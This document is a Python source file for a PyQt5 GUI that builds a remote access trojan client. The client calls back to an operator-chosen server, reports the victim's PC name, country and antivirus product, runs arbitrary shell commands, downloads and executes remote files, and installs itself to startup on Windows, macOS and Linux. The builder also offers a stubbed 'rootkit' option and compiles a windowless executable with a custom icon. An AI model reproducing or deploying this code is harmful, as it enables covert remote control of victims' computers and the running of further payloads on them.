import sys
import os
import subprocess
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtWidgets import QApplication, QMainWindow, QMessageBox, QFileDialog, QVBoxLayout, QLabel, QLineEdit, QCheckBox, QPushButton, QComboBox

class ClientBuilder(QMainWindow):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setWindowTitle("Client Builder")
        self.setGeometry(100, 100, 400, 500)

        layout = QVBoxLayout()

        self.server_ip_label = QLabel("Server IP:")
        self.server_ip_input = QLineEdit()
        layout.addWidget(self.server_ip_label)
        layout.addWidget(self.server_ip_input)

        self.server_port_label = QLabel("Server Port:")
        self.server_port_input = QLineEdit()
        layout.addWidget(self.server_port_label)
        layout.addWidget(self.server_port_input)

        self.os_label = QLabel("Target OS:")
        self.os_combo = QComboBox()
        self.os_combo.addItems(["Windows", "macOS", "Linux"])
        layout.addWidget(self.os_label)
        layout.addWidget(self.os_combo)

        self.auto_reconnect_checkbox = QCheckBox("Enable Auto Reconnect")
        layout.addWidget(self.auto_reconnect_checkbox)

        self.download_execute_checkbox = QCheckBox("Enable Download and Execute")
        layout.addWidget(self.download_execute_checkbox)

        self.ping_checkbox = QCheckBox("Enable Ping Command")
        layout.addWidget(self.ping_checkbox)

        self.rootkit_checkbox = QCheckBox("Enable Rootkit")
        layout.addWidget(self.rootkit_checkbox)

        self.startup_checkbox = QCheckBox("Add to Startup")
        layout.addWidget(self.startup_checkbox)

        self.icon_label = QLabel("Icon File (optional):")
        self.icon_button = QPushButton("Select Icon")
        self.icon_button.clicked.connect(self.select_icon)
        layout.addWidget(self.icon_label)
        layout.addWidget(self.icon_button)

        self.build_button = QPushButton("Build Client")
        self.build_button.clicked.connect(self.build_client)
        layout.addWidget(self.build_button)

        container = QtWidgets.QWidget()
        container.setLayout(layout)
        self.setCentralWidget(container)
        self.icon_path = ""

    def select_icon(self):
        self.icon_path, _ = QFileDialog.getOpenFileName(self, "Select Icon File", "", "Icon Files (*.ico *.icns)")
        if self.icon_path:
            self.icon_label.setText(f"Icon File: {os.path.basename(self.icon_path)}")

    def build_client(self):
        server_ip = self.server_ip_input.text()
        server_port = self.server_port_input.text()
        target_os = self.os_combo.currentText()
        auto_reconnect = self.auto_reconnect_checkbox.isChecked()
        download_execute = self.download_execute_checkbox.isChecked()
        ping_command = self.ping_checkbox.isChecked()
        rootkit = self.rootkit_checkbox.isChecked()
        add_to_startup = self.startup_checkbox.isChecked()

        if not server_ip or not server_port:
            QMessageBox.warning(self, "Input Error", "Please provide both server IP and port.")
            return

        client_code = self.generate_client_code(server_ip, server_port, target_os, auto_reconnect, download_execute, ping_command, rootkit, add_to_startup)

        save_path, _ = QFileDialog.getSaveFileName(self, "Save Client File", "", "Python Files (*.py)")
        if save_path:
            with open(save_path, 'w') as file:
                file.write(client_code)
            QMessageBox.information(self, "Success", "Client script created successfully.")
            if target_os == "Windows":
                self.build_exe(save_path)

    def generate_client_code(self, server_ip, server_port, target_os, auto_reconnect, download_execute, ping_command,
                             rootkit, add_to_startup):
        os_specific_code = {
            "Windows": """
    def get_antivirus(self):
        if platform.system() == "Windows":
            cmd = 'powershell "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName"'
            output = self.popen(cmd)
            if output:
                return output.decode('utf-8').split("\\n")[3].strip()
        return "Unknown"

    def add_to_startup(self):
        if platform.system() == "Windows":
            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
            script_path = os.path.abspath(sys.argv[0])
            startup_script_path = os.path.join(startup_folder, os.path.basename(script_path) + ".bat")
            with open(startup_script_path, 'w') as startup_script:
                startup_script.write(f'@echo off\\nstart "" "{script_path}"')
        """,
            "macOS": """
    def get_antivirus(self):
        return "Unknown"  # Implement macOS-specific antivirus detection if needed

    def add_to_startup(self):
        if platform.system() == "Darwin":
            startup_item = f'''
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
            <plist version="1.0">
                <dict>
                    <key>Label</key>
                    <string>{os.path.basename(sys.argv[0])}</string>
                    <key>ProgramArguments</key>
                    <array>
                        <string>python3</string>
                        <string>{os.path.abspath(sys.argv[0])}</string>
                    </array>
                    <key>RunAtLoad</key>
                    <true/>
                </dict>
            </plist>'''
            plist_path = os.path.expanduser(f'~/Library/LaunchAgents/{os.path.basename(sys.argv[0])}.plist')
            with open(plist_path, 'w') as plist:
                plist.write(startup_item)
        """,
            "Linux": """
    def get_antivirus(self):
        return "Unknown"  # Implement Linux-specific antivirus detection if needed

    def add_to_startup(self):
        if platform.system() == "Linux":
            startup_script_path = os.path.expanduser('~/.config/autostart/') + os.path.basename(sys.argv[0]) + '.desktop'
            startup_script_content = f'''
            [Desktop Entry]
            Type=Application
            Exec=python3 {os.path.abspath(sys.argv[0])}
            Hidden=false
            NoDisplay=false
            X-GNOME-Autostart-enabled=true
            Name={os.path.basename(sys.argv[0])}'''
            with open(startup_script_path, 'w') as startup_script:
                startup_script.write(startup_script_content)
        """
        }

        rootkit_code = """
    def install_rootkit(self):
        try:
            # Example rootkit installation code
            if platform.system() == "Windows":
                # Windows-specific rootkit code
                pass
            elif platform.system() == "Linux":
                # Linux-specific rootkit code
                pass
            elif platform.system() == "Darwin":
                # macOS-specific rootkit code
                pass
        except Exception as e:
            print(f"Rootkit installation failed: {e}")
    """ if rootkit else ""

        client_template = f"""
import socket
import subprocess
from threading import Thread, Timer
from time import sleep
import signal, sys, platform, requests, os
import inspect
from typing import Tuple

AUTHORIZATION = ""  # (optional) Set this to the authorization token you want to use
MAX_CHUNK_SIZE = 16 * 1024  # 16KB
POPEN_TIMEOUT = 300  # seconds

class Status:
    OK = "OK"
    FAIL = "FAIL"

class Request:
    def __init__(self, send: str = "", status: str = Status.OK, body: dict = {{}}, header: dict = {{}}, encoding: str = "utf-8"):
        self.header = {{"status": status}}
        self.encoding = encoding

        if status == Status.FAIL:
            self.header["error"] = send

        if isinstance(body, dict):
            self.header["ct"] = "TEXT"

            if status == Status.FAIL:
                self.body = {{"output": "", **body}}
            else:
                self.body = {{"output": send, **body}}

        elif isinstance(body, bytes):
            self.header["ct"] = "BYTES"
            self.body = body

        elif isinstance(body, object):
            self.header["ct"] = "FILE"
            self.body = body

        self.header = {{**self.header, **header}}

    def __str__(self):
        return f"Request(header={{self.header}}, body={{self.body}})"

    def __repr__(self):
        return self.__str__()

    def set_header(self, key: str, value: str):
        self.header[key] = value

    def get_payload(self) -> bytes:
        return (
            "\\r\\n".join(f"{{key}}: {{value}}" for key, value in self.header.items())
            + "\\r\\n\\r\\n"
            + "\\r\\n".join(f"{{key}}: {{value}}" for key, value in self.body.items())
        ).encode(self.encoding)

    def __iter__(self):
        yield (
            "\\r\\n".join(f"{{key}}: {{value}}" for key, value in self.header.items())
            + "\\r\\n\\r\\n"
        ).encode(self.encoding)

        if self.header["ct"] == "TEXT":
            yield (
                "\\r\\n".join(f"{{key}}: {{value}}" for key, value in self.body.items())
            ).encode(self.encoding)

        elif self.header["ct"] == "FILE":
            while data := self.body.read(MAX_CHUNK_SIZE):
                yield data

        elif self.header["ct"] == "BYTES":
            yield self.body

        yield b'\\x00\\x00\\xff\\xff'

class Response:
    def __init__(self, payload: bytes, encoding: str = "utf-8") -> None:
        self.raw_header, self.raw_body = payload.split(b"\\r\\n\\r\\n", 1)
        self.header = {{}}
        self.body = {{}}
        self.encoding = encoding

        for row in self.raw_header.decode(encoding).split("\\r\\n"):
            row_split_list = list(map(lambda x: x.strip(), row.split(":")))
            self.header[row_split_list[0]] = ":".join(row_split_list[1:]) or None

        for row in self.raw_body.decode(encoding).split("\\r\\n"):
            row_split_list = list(map(lambda x: x.strip(), row.split(":")))
            self.body[row_split_list[0]] = ":".join(row_split_list[1:]) or None

        self._direct = self.header["method"] == "DIRECT"
        self._connect = self.header["method"] == "CONNECT"

    def __str__(self):
        return f"Response(header={{self.header}}, body={{self.body}})"

    def __repr__(self):
        return self.__str__()

    @property
    def auth(self):
        return self.header.get("authorization")

    @property
    def cmd(self):
        return self.body.get("cmd")

    @property
    def params(self):
        return self.body.get("params")

    @property
    def ack(self):
        return self.body.get("ack")

class Client:
    def __init__(self, addr: Tuple[str, int] = ("{server_ip}", {server_port})) -> None:
        signal.signal(signal.SIGINT, self.exit_gracefully)
        signal.signal(signal.SIGTERM, self.exit_gracefully)
        self.stop = False
        self.run = False

        self.direct = direct = {{}}
        for attr, func in inspect.getmembers(self):
            if attr.startswith("direct_"):
                direct[attr[7:].upper()] = func

        self.connect = connect = {{}}
        for attr, func in inspect.getmembers(self):
            if attr.startswith("connect_"):
                connect[attr[8:].upper()] = func

        while not self.stop:
            try:
                self._connect(addr)
            except KeyboardInterrupt:
                continue
            except Exception as ex:
                print(f"Error connecting {{addr}}| Sleep 0 seconds")
                sleep(0)

    def exit_gracefully(self, signum, frame):
        print("\\nExiting....")
        self.stop = True
        self.run = False
        self.conn.close()
        sleep(1)
        sys.exit(0)

    def _connect(self, connect: Tuple[str, int]) -> None:
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn.connect(connect)
        self.send_initial_info()
        self.start()

    def send_initial_info(self):
        pc_name = platform.node()
        country = self.get_country()
        antivirus = self.get_antivirus()
        initial_info = f"PC Name: {{pc_name}}, Country: {{country}}, Antivirus: {{antivirus}}"
        print(f"Sending initial info: {{initial_info}}")  # Debugging statement
        self.conn.send(initial_info.encode('utf-8'))

    def get_country(self):
        try:
            response = requests.get('https://ipapi.co/country_name/')
            return response.text.strip()
        except Exception:
            return "Unknown"

        {os_specific_code[target_os]}

    def send(self, req: Request) -> None:
        for payload in req:
            self.conn.send(payload)

    def recv(self) -> Response:
        data = self.conn.recv(MAX_CHUNK_SIZE)
        if not data:
            return None

        res = Response(data)
        return res

    def start(self) -> None:
        while True:
            response = self.recv()

            if not response:
                continue

            cmd = response.cmd
            ack = response.cmd
            params = response.params.split(" ") if response.params else response.params

            if response._direct:
                self.method_direct(cmd, ack, params)

            elif response._connect:
                self.method_connect(cmd, ack, params)

            else:
                print("Invalid command")

    def method_direct(self, cmd: str, ack: str, params: str) -> None:
        if cmd in self.direct:
            self.direct[cmd](ack, params)
        else:
            print("Invalid command")

    def direct_ping(self, ack: str, params: str) -> None:
        if ack:
            self.send(Request("Pong"))

    def direct_stop(self, ack: str, params: str) -> None:
        if ack:
            self.send(Request("Stopping client"))
        self.exit_gracefully(None, None)

    def method_connect(self, cmd: str, ack: str, params: str) -> None:
        if cmd in self.connect:
            self.connect[cmd](ack, params)
        else:
            self.send(Request("Invalid command"))

    def connect_shell(self, ack: str, params: str) -> None:
        output = self.popen(cmd=params)
        if ack:
            self.send(Request(body=output))

    def connect_download_execute(self, ack: str, params: str) -> None:
        file_url = params[0]
        try:
            file_name = file_url.split('/')[-1]
            self.download_file(file_url, file_name)
            output = self.execute_file(file_name)
            if ack:
                self.send(Request(body=output))
        except Exception as e:
            if ack:
                self.send(Request(str(e), status=Status.FAIL))

    def download_file(self, url: str, file_name: str) -> None:
        response = requests.get(url)
        with open(file_name, 'wb') as file:
            file.write(response.content)
        print(f"Downloaded {{file_name}} from {{url}}")

    def execute_file(self, file_name: str) -> str:
        result = subprocess.run(file_name, shell=True, capture_output=True)
        output = result.stdout + result.stderr
        return output.decode('utf-8')

    def popen(self, cmd: list) -> str:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
        timer = Timer(POPEN_TIMEOUT, process.terminate)
        try:
            timer.start()
            stdout, stderr = process.communicate()
            output = stdout or stderr
        finally:
            timer.cancel()

        final_output = output.replace(b"\\r\\n", b"\\n").decode(encoding="utf-8").encode()
        return final_output

        {rootkit_code}

        if {add_to_startup}:
            self.add_to_startup()

if __name__ == "__main__":
    Client()
"""
        return client_template

    def build_exe(self, script_path):
        exe_path, _ = QFileDialog.getSaveFileName(self, "Save Executable", "", "Executable Files (*.exe)")
        if exe_path:
            command = ['pyinstaller', '--onefile', '--noconsole', script_path, '--distpath', os.path.dirname(exe_path), '--name', os.path.basename(exe_path)]
            if self.icon_path:
                command.extend(['--icon', self.icon_path])
            subprocess.call(command)
            QMessageBox.information(self, "Success", "Executable created successfully.")

if __name__ == '__main__':
    app = QApplication(sys.argv)
    builder = ClientBuilder()
    builder.show()
    sys.exit(app.exec_())


